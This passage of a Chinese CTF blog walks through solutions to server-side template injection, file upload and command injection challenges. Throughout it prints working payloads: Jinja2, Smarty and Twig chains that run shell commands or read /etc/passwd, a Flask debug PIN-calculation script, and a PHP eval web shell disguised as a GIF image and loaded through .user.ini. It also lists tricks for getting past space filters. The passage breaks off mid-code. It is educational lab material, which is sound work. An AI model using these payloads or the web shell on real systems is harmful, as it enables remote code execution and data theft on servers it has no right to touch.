<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-83.png" style="zoom:80%;" loading="lazy">

<p>4、访问</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//111.198.29.45:46675/&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()&#125;&#125;</span></span></code></pre>

<p>查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-84.png" alt loading="lazy"></p>
<p>5.使用<code>[&#39;o&#39;+&#39;s&#39;]</code>,可绕过对<code>os</code>字符的过滤，访问</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//111.198.29.45:46675/&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()')&#125;&#125;</span></span></code></pre>

<p>查看flag文件所在</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-85.png" alt loading="lazy"></p>
<p>6、访问</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//111.198.29.45:46675/&#123;&#123;"".__class__.__mro__[2].__subclasses__()[40]("fl4g").read()&#125;&#125;</span></span></code></pre>

<p>可得到flag，如图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-86.png" alt loading="lazy"></p>
<p><strong>writeup里的另外一种姿势：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-87.png" alt loading="lazy"></p>
<p><strong>另外，里面还有一种更骚的操作：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-88.png" alt loading="lazy"></p>
<p>这里用到了一个工具：<a href="https://github.com/epinna/tplmap">tplmap</a></p>
<p>一个扫描服务器端模板注入漏洞的开源工具 ，需要自取</p>
<p>附上OS文件目录的方法： <a href="https://www.runoob.com/python/os-file-methods.html">Python OS 文件/目录方法</a></p>
<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="BJDCTF-2nd-fake google"></a>BJDCTF-2nd-fake google</h3><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200324100426394.png" alt loading="lazy"></p>
<p>随便输入测试后得到一以下结果，推测是SSTI</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200324100451322.png" alt loading="lazy"></p>
<p>F12打开后发现提示果然是SSTI</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200324100534466.png" alt loading="lazy"></p>
<p>测试后发现啥都没过滤，于是直接上payload：</p>
<p>payload1：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cd ..;ls;cat flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<p>payload2：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'cat /flag | base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>命令执行：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('id').read()"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<p>文件操作：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="护网杯 2018-easy_tornado"></a>护网杯 2018-easy_tornado</h3><p>题目界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200412112736253.png" alt loading="lazy"></p>
<p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=766846dacf2bd89cde918d880dd30d77</code></p>
<p>根据提示<code>flag</code>在<code>/fllllllllllllag</code>中，<code>hints</code>为<code>md5(cookie_secret+md5(filename))</code></p>
<p>观察url后推测出其中的关系<code>filehash=md5(cookie_secret+md5(filename))</code></p>
<p>也就是说<code>filename</code>有了，只需要拿到<code>cookie_secret</code>再经过<code>md5</code>换算后传入即可得到<code>flag</code></p>
<p>一种方法，根据已有的<code>filename</code>和<code>filehash</code>爆破出<code>cookie_secret</code>值，当然这种方法爆破不知道爆破到什么时候去了，随手测试后发现当<code>filename</code>和<code>filehash</code>不对应的时候有一个error页面</p>
<p>url格式：<code>http://70c4e22b-ffb9-4933-b754-737df58fec82.node3.buuoj.cn/error?msg=Error</code></p>
<p>测试<code>error?msg=&#123;&#123;1&#125;&#125;</code>发现有回显，应该存在模板注入</p>
<p>百度<code>reader</code>发现是<code>Tornado</code>框架中的一个渲染模板</p>
<p>参考：<a href="https://xz.aliyun.com/t/2908">https://xz.aliyun.com/t/2908</a></p>
<p>通过<code>handler.application</code>可访问整个Tornado</p>
<p>通过<code>&#123;&#123;handler.application.settings&#125;&#125;</code>或者<code>&#123;&#123;handler.settings&#125;&#125;</code>就可获得<code>settings</code>中的<strong>cookie_secret</strong></p>
<p><code>/fllllllllllllag</code>md5加密后在前面加上<code>cookie_secret</code>再经过md5加密后的值再和<code>/fllllllllllllag</code>传入url中即可得到flag</p>
<h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="BJDCTF2020-The mystery of ip"></a>BJDCTF2020-The mystery of ip</h3><p>flag.php界面会回显ip，抓包改XFF头，成功伪造，</p>
<p>这里考的是smarty模板注入，</p>
<p>关于smarty的SSTI可以参考<a href="https://www.freebuf.com/column/219913.html">https://www.freebuf.com/column/219913.html</a></p>
<p>拿flag的payload：<code>X-Forwarded-For: &#123;&#123;system('cat /flag')&#125;&#125;</code></p>
<h3 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="BJDCTF2020-Cookie is so stable"></a>BJDCTF2020-Cookie is so stable</h3><p>首先在<code>flag.php</code>界面进行测试，<code>&#123;&#123;7*'7'&#125;&#125;</code>，返回49，那应该就是<code>Twig</code>模板了，直接给出<code>payload</code>：</p>
<p><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></p>
<h3 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h3><p>界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200815223254907.png" alt loading="lazy"></p>
<p>可以看到这样界面所拥有的功能，加解密base64，并且输入不当会触发debug模式，也就是说这个debug没关，转到提示界面，html源码中存在一个小hint —&gt; <code>&lt;!-- PIN ---&gt;</code>，不出意外应该就是要获得这个PIN码来到debug界面进行命令执行操作了</p>
<p>结果测试在解密界面存在SSTI，既<code>&#123;&#123;7+7&#125;&#125;</code>输出结果14，于是尝试在这里进行命令执行或文件读取，fuzz后发现过滤了挺多东西了，诸如<code>import、popen、system、eval、flag</code>等关键字，但是可以进行文件读取</p>
<p>payload：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>

<p>base64编码后：</p>
<pre class="language-none"><code class="language-none">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignZmxhZy5waHAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9</code></pre>

<p>传入可以看到<code>/etc/passwd</code>的内容</p>
<p>这时根据题目意思，获取PIN码</p>
<p>原理参考这篇博客：<a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></p>
<p>上脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'flaskweb'</span><span class="token punctuation">,</span>     <span class="token comment"># 服务器运行flask所登录的用户名。 通过/etc/passwd中可以猜测为flaskweb 或者root ，此处用的flaskweb</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span>    <span class="token comment"># modname 一般不变就是flask.app</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span>        <span class="token comment"># getattr(app, "__name__", app.__class__.__name__)  python该值一般为Flask 值一般不变</span>
    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span><span class="token punctuation">,</span>   <span class="token comment"># flask库下app.py的绝对路径。通过报错信息就会泄露该值。本题的值为</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment"># 当前网络的mac地址的十进制数。通过文件/sys/class/net/eth0/address 获取: print(int('02:42:ae:00:33:f5'.replace(':', ''), 16))</span>
    <span class="token string">'2485410345973'</span><span class="token punctuation">,</span>
    <span class="token comment"># 最后一个就是机器的id</span>
    <span class="token comment"># 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，</span>
    <span class="token comment"># windows的id获取跟linux也不同。</span>
    <span class="token comment"># 对于docker机则读取/proc/self/cgroup</span>
    <span class="token string">'44547b3a0bae08513cd0bacbd2f23a304505e1051c10f267af9b86649a6e7c89'</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> <span class="token boolean">None</span>
<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span><span class="token boolean">None</span>
<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        rv <span class="token operator">=</span> num

<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>

<p>随后得到PIN码，到debug界面用shell执行代码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/SSTI/image-20200815224222481.png" alt loading="lazy"></p>
<p>得到flag</p>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html">记一次Flask模板注入学习 [GYCTF2020]FlaskApp</a></li>
<li><a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a></li>
<li><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></li>
<li><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></li>
</ul>
<h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>常规SSTI，传入search=49后发现存在模板注入，于是打payload</p>
<p>测试后发现传入一些数据后服务器会500，推测后端做了过滤，查阅资料后发现可利用<code>subprocess.Popen</code>执行命令</p>
<p>payload：<code>?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></p>
<p><strong>参考</strong></p>
<ul>
<li><a href="https://github.com/sturmisch/cscctf-problem/tree/master/2019/qual/web/flasklight">官方wp</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>python</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-文件上传</title>
    <url>/posts/592e5fba/</url>
    <content><![CDATA[<h3 id="2019SUCTF—CheckIn"><a href="#2019SUCTF—CheckIn" class="headerlink" title="2019SUCTF—CheckIn"></a>2019SUCTF—CheckIn</h3><p>题目源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p>
<p>复现链接：<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>

<h4 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h4><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209103925041.png" alt loading="lazy"></p>
<p>上传一句话.php文件，结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104816676.png" alt loading="lazy"></p>
<p>更改后缀和文件类型为图片格式，结果如下，过滤了<code>&lt;?</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105358989.png" alt loading="lazy"></p>
<p>用<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>类型的图片马绕过，结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105253270.png" alt loading="lazy"></p>
<p>应该调用了后端的<code>exif_imagetype()</code>函数，于是添加文件头绕过<code>GIF89a</code>，上传成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209110003787.png" alt loading="lazy"></p>
<p>到这一步应该想到上传一个<code>.htaccess</code>文件来将图片马解析为php，尝试无果，于是用到了下面的.user.ini文件</p>
<p>参考</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a></p>
<p><a href="https://xz.aliyun.com/t/6091#toc-1">从SUCTF 2019 CheckIn 浅谈.user.ini的利用</a></p>
</blockquote>
<h4 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="上传-uesr-ini文件"><a href="#上传-uesr-ini文件" class="headerlink" title="上传.uesr.ini文件"></a>上传.uesr.ini文件</h5><p>内容如下：</p>
<pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a
<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">a.jpg</span></code></pre>



<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104439117.png" alt loading="lazy"></p>
<blockquote>
<p>ini文件设置中有两个参数：<code>auto_prepend_file</code>和<code>auto_append_file</code></p>
<p>表示我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code></p>
<p>两个设置的区别在于<strong>auto_prepend_file</strong>是在文件前插入；<strong>auto_append_file</strong>在文件最后插入（当文件调用的有<code>exit()</code>时该设置无效）</p>
</blockquote>
<p>利用前提需要文件目录下有一个可执行的.php文件，而题目刚好有一个</p>
<h5 id="上传a-jpg图片马"><a href="#上传a-jpg图片马" class="headerlink" title="上传a.jpg图片马"></a>上传a.jpg图片马</h5><pre class="language-php" data-language="php"><code class="language-php">GIF89a
<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113304522.png" alt loading="lazy"></p>
<p>访问index.php，用工具连接后台，在网站根目录下得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113410626.png" alt loading="lazy"></p>
<p>也可以将图片马代码改成如下方式</p>
<pre class="language-php" data-language="php"><code class="language-php">GIF89a
<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>

<p>直接访问index.php即可得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-命令执行</title>
    <url>/posts/c714e372/</url>
    <content><![CDATA[<h3 id="2019GXYCTF-Ping-Ping-Ping"><a href="#2019GXYCTF-Ping-Ping-Ping" class="headerlink" title="2019GXYCTF-Ping Ping Ping"></a>2019GXYCTF-Ping Ping Ping</h3><p>12月份的GWYCTF，BUUCTF上复现</p>
<p>别人学校招新的题目，我还是不会，太菜了</p>
<span id="more"></span>

<p>先来看看题目的界面</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt loading="lazy"></p>
<p>由题意得，传参ip</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt loading="lazy"></p>
<p>联想命令执行，命令执行的方法大致两种：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">;</span>：用于连续指令执行
<span class="token operator">|</span>：管道符，将左边的输出当做右边的输入，只返回右边的结果</code></pre>

<p>尝试分号：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt loading="lazy"></p>
<p>发现目录下包含两个文件：index.php 和 flag.php</p>
<p>尝试cat查看：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt loading="lazy"></p>
<p>emmmmmmmmmmmmm空格被办了。。。</p>
<p>从大佬那学习绕过空格的方法，大概有以下几种：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">$IFS</span>
<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>
<span class="token environment constant">$IFS</span><span class="token variable">$1</span> //<span class="token variable">$1</span>改成$加其他数字貌似都行
<span class="token operator">&lt;</span> 
<span class="token operator">&lt;></span> 
<span class="token punctuation">&#123;</span>cat,flag.php<span class="token punctuation">&#125;</span>  //用逗号实现了空格功能
%20 
%09 </code></pre>

<p>各种尝试后发现$IFS$1有效，分别查看两个文件，如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt loading="lazy"></p>
<p>index.php代码如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span>
<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
